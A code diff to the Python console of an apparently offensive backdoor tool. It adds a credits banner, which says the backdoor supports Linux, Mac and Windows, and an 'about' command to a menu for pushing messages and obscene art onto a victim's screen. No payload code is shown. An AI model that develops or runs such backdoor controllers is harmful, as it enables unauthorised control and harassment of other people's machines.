@@ -14,7 +14,11 @@ port = port.replace('\n', '')
 port = port.replace(' ', '')
 read_port.close()
 
+def about():
+    print('\033[1;31mCreate By     \t\t\t        \033[1;36m>\033[1;37m \tIHA\n\033[1;31mWritten Language\t        \t\033[1;36m>\033[1;37m \tPython3 & shell\n\033[1;31mSupported Operation System\t\t\033[1;36m>\033[1;37m \tKali Linux\n\033[1;31mBackdoor Support OS\t\t\t\033[1;36m>\033[1;37m\tLinux, Mac or Window\n\033[1;31mGitHub \t\t\t\t\t\033[1;36m>\033[1;37m\thttps://github.com/IHA-arch\n\n\n')
+
 def use_command():
+    print("about                    Tool Creater information")
     print("show <any message>       show message on the client screen")
     print("show 1 or 2 or 3         show a mid finger ascii art on the client screen")
     print("cls                      clear the client screen")
@@ -44,6 +48,9 @@ while True:
         send_data = 'printf ""'
     elif send_data == 'help':
         use_command()
+        send_data = 'printf ""'
+    elif send_data == 'about':
+        about()
         send_data = 'printf ""'
     elif send_data == 'exit':
         send_data = 'exit()'
